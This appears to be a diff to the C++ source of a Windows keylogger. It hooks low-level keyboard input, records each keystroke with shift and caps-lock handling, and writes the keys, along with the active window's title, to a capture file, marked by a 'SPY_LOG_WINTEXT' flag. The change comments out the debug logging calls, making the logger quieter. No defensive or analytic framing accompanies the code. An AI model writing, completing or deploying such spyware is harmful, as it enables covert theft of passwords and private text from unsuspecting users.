@@ -1,12 +1,12 @@
 #include "kbhook.h"
-#include "kbhfile.h"
+#include "../stg/kbhfile.h"
 
 HHOOK KBHook::hook_handle = NULL;
 KBHFile * KBHook::kbhfile = NULL;
 
 LRESULT KBHook::hook_proc(int n_code, WPARAM w_param, LPARAM l_param)
 {
-	LOG("Has keyboard hook data code %d", n_code);
+	//LOG("Has keyboard hook data code %d", n_code);
 	if (n_code == HC_ACTION)
 		process_hkdt(w_param, l_param);
 	return CallNextHookEx(NULL, n_code, w_param, l_param);
@@ -20,18 +20,18 @@ VOID KBHook::process_hkdt(WPARAM w_param, LPARAM l_param)
 #endif
 	static bool shift = false;// shift key state(down/up?)
 
-	LOG("enter processing keyboard hook data...");
+	//LOG("enter processing keyboard hook data...");
 	const KBDLLHOOKSTRUCT * kbdt = (KBDLLHOOKSTRUCT *)l_param;
 
 	if (kbdt->vkCode == VK_LSHIFT || kbdt->vkCode == VK_RSHIFT)
 	{
 		shift = (w_param == WM_KEYDOWN);
-		LOG("shift is %s", shift ? "ON" : "OFF");
+		//LOG("shift is %s", shift ? "ON" : "OFF");
 	}
 
 	if (w_param == WM_SYSKEYDOWN || w_param == WM_KEYDOWN)
 	{
-		LOG("key has been pressed!");
+		//LOG("key has been pressed!");
 		prepare_kbhfile();
 #ifdef SPY_LOG_WINTEXT
 		// save window text which typed on it
@@ -40,7 +40,7 @@ VOID KBHook::process_hkdt(WPARAM w_param, LPARAM l_param)
 		if (old_hwnd != new_hwnd || kbhfile->get_position() == 0)
 		{
 			const int ret = GetWindowTextA(new_hwnd, w_text, SPY_MAX_WTEXT_LTH);
-			LOG("window text is '%s'", w_text);
+			//LOG("window text is '%s'", w_text);
 			kbhfile->write("\n[", 2);
 			kbhfile->write(w_text, ret);
 			kbhfile->write("]\n", 2);
@@ -48,8 +48,8 @@ VOID KBHook::process_hkdt(WPARAM w_param, LPARAM l_param)
 		}
 #endif
 		const bool caps = GetKeyState(VK_CAPITAL) < 0;// check caps lock pressed?
-		LOG("caps is %s", caps ? "ON" : "OFF");
-		LOG("write pressed key...");
+		//LOG("caps is %s", caps ? "ON" : "OFF");
+		//LOG("write pressed key...");
 		switch (kbdt->vkCode)
 		{
 			// number keys
@@ -256,7 +256,7 @@ VOID KBHook::process_hkdt(WPARAM w_param, LPARAM l_param)
 #endif
 		}
 	}
-	LOG("finish processing keyboard hook data!");
+	//LOG("finish processing keyboard hook data!");
 }
 
 HHOOK KBHook::register_hook(HINSTANCE dll_instance)
